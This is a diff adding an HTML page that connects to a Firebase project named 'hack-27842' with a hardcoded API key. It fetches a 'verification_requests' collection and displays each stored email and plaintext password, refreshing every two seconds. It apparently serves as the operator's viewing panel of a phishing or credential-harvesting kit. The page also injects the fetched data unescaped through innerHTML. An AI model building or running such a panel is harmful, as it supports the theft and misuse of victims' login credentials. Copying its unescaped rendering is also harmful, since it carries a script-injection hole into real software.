@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Display Information</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            text-align: center;
+            padding: 50px;
+            margin: 0;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            color: #333;
+        }
+        .info {
+            font-size: 18px;
+            color: #666;
+        }
+        .message {
+            font-size: 20px;
+            color: green;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Submitted Information</h1>
+        <div id="info" class="info"></div>
+        <div id="message" class="message"></div>
+    </div>
+
+    <!-- Firebase App (the core Firebase SDK) -->
+    <script type="module">
+        import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.21.0/firebase-app.js';
+        import { getFirestore, collection, getDocs } from 'https://www.gstatic.com/firebasejs/9.21.0/firebase-firestore.js';
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBHquXAfwBPnFpGQ7No-kC17O25PRsceHY",
+            authDomain: "hack-27842.firebaseapp.com",
+            projectId: "hack-27842",
+            storageBucket: "hack-27842.appspot.com",
+            messagingSenderId: "606359984765",
+            appId: "1:606359984765:web:a5df7d7ed3e70432deaf14"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        const infoDiv = document.getElementById('info');
+
+        async function displayInfo() {
+            try {
+                const querySnapshot = await getDocs(collection(db, 'verification_requests'));
+                if (querySnapshot.empty) {
+                    infoDiv.innerHTML = '<p>No information available.</p>';
+                    return;
+                }
+                let content = '';
+                querySnapshot.forEach(doc => {
+                    const data = doc.data();
+                    content += `<p>Email: ${data.email}<br>Password: ${data.password}</p><hr>`;
+                });
+                infoDiv.innerHTML = content;
+            } catch (error) {
+                console.error('Error fetching data:', error);
+                infoDiv.innerHTML = '<p>Error fetching data.</p>';
+            }
+        }
+
+        // Display information immediately
+        displayInfo();
+
+        // Optionally update information every 2 seconds
+        setInterval(displayInfo, 2000);
+    </script>
+</body>
+</html>
